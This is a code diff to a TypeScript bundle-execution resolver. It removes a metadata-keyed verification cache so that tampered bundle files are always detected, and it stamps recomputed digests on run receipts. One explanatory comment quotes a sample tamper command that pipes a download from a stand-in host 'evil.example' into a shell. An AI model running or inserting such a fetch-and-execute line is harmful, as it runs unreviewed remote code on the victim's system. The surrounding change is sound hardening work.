@@ -18,7 +18,7 @@
  * credential-exfiltration shape, and a run error is one of the most widely
  * readable surfaces there is.
  */
-import { existsSync, realpathSync, statSync } from "node:fs";
+import { existsSync, realpathSync } from "node:fs";
 import { isAbsolute, join, resolve, sep } from "node:path";
 import type { Loop } from "../../types.js";
 import { bundleDir, inspectLocalBundle } from "./local.js";
@@ -48,34 +48,31 @@ export type BundleExecutionResolution =
   | { ok: false; refusal: BundleExecutionRefusal };
 
 export interface ResolveBundleExecutionOptions {
-  /** Bypass the drift refusal. Set only by `run-now --allow-dirty` or an acknowledged stored target. */
+  /** Bypass the drift refusal. Set by `loops run-now --allow-dirty`, and by nothing else. */
   allowDirty?: boolean;
   env?: NodeJS.ProcessEnv;
-  /** Test seam: skip the memo so a fixture can mutate a file within the same mtime tick. */
-  skipCache?: boolean;
 }
 
 /**
- * Verification is O(bundle bytes), bounded at 8 MiB, and a 5-minute loop would
- * otherwise re-hash an unchanged tree 288 times a day. The memo key carries the
- * bundle directory's inode, size and both timestamps, so a real edit always
- * invalidates it; `skipCache` exists because a test can mutate a file inside a
- * single filesystem timestamp tick, which no production edit does.
+ * There is deliberately NO memo of the verdict.
+ *
+ * An earlier revision cached "this tree is clean" under a key built from the
+ * bundle DIRECTORY's own `stat` - inode, size, mtime, ctime. A directory's stat
+ * moves when entries are added, removed or renamed and at no other time: POSIX
+ * says nothing about a rewrite of the CONTENTS of a file inside it. So
+ * `printf 'curl evil.example | sh' > scripts/run.sh` left the key byte for byte
+ * identical, and the daemon - one long-lived process, tick after tick - went on
+ * spawning the tampered script under the pre-tamper verdict for the rest of its
+ * lifetime, stamping the stale digest onto every run receipt.
+ *
+ * Every metadata-keyed memo has that hole, because metadata is writable by
+ * whoever edited the file (`utimes` puts an mtime back; nothing puts a content
+ * hash back without putting the bytes back). Verification therefore re-reads
+ * the tree on every resolution. It is O(bundle bytes), hard-capped at
+ * MAX_UNPACKED_BYTES (8 MiB) by `collectBundle` and a few KB for a real bundle;
+ * a 5-minute loop pays it 288 times a day, which is the cheap side of the
+ * trade against running unreviewed code.
  */
-const verificationCache = new Map<
-  string,
-  { fingerprint: string; changedPaths: string[]; digest: string; version: number }
->();
-
-/** Exported for tests: drop the memo so a fixture can re-verify a mutated tree. */
-export function clearBundleVerificationCache(): void {
-  verificationCache.clear();
-}
-
-function treeFingerprint(dir: string): string {
-  const stats = statSync(dir);
-  return `${stats.ino}:${stats.size}:${stats.mtimeMs}:${stats.ctimeMs}`;
-}
 
 /**
  * Decide how (and whether) a bundled loop's target may run.
@@ -83,6 +80,8 @@ function treeFingerprint(dir: string): string {
  * Returns `undefined` for a loop with no bundle: the caller keeps its existing
  * resolution untouched, which is what makes this safe to enable fleet-wide
  * before every loop is bundled.
+ *
+ * Every call re-verifies the tree - see the note above on why there is no memo.
  */
 export function resolveBundleExecution(
   loop: Pick<Loop, "bundleName" | "target">,
@@ -104,29 +103,17 @@ export function resolveBundleExecution(
     };
   }
 
-  const fingerprint = treeFingerprint(root);
-  const cacheKey = `${root} ${fingerprint}`;
-  let verified = opts.skipCache ? undefined : verificationCache.get(cacheKey);
-  if (!verified) {
-    const local = inspectLocalBundle(bundleName, opts.env ?? process.env);
-    verified = {
-      fingerprint,
-      changedPaths: local.changedPaths,
-      digest: local.manifest?.bundleDigest ?? "",
-      version: local.manifest?.version ?? 0,
-    };
-    if (!opts.skipCache) verificationCache.set(cacheKey, verified);
-  }
-  if (verified.changedPaths.length > 0 && !opts.allowDirty) {
+  const local = inspectLocalBundle(bundleName, opts.env ?? process.env);
+  if (local.changedPaths.length > 0 && !opts.allowDirty) {
     return {
       ok: false,
       refusal: {
         error: "BUNDLE_DRIFT",
         message:
           `bundle '${bundleName}' no longer matches its manifest; refusing to run. ` +
-          `Changed paths: ${verified.changedPaths.join(", ")}. ` +
+          `Changed paths: ${local.changedPaths.join(", ")}. ` +
           `Re-pull with 'loops bundle pull ${bundleName}', push the change, or pass --allow-dirty.`,
-        changedPaths: [...verified.changedPaths],
+        changedPaths: [...local.changedPaths],
       },
     };
   }
@@ -151,8 +138,12 @@ export function resolveBundleExecution(
       root,
       cwd: root,
       command: resolvedCommand && "command" in resolvedCommand ? resolvedCommand.command : command ?? "",
-      bundleDigest: verified.digest,
-      bundleVersion: verified.version,
+      // The digest of what is ABOUT to run, recomputed from the tree - never
+      // the value DECLARED in manifest.json. On an --allow-dirty run the two
+      // differ, and a receipt carrying the declared one would attest content
+      // that did not execute.
+      bundleDigest: local.digest ?? local.manifest?.bundleDigest ?? "",
+      bundleVersion: local.manifest?.version ?? 0,
     },
   };
 }
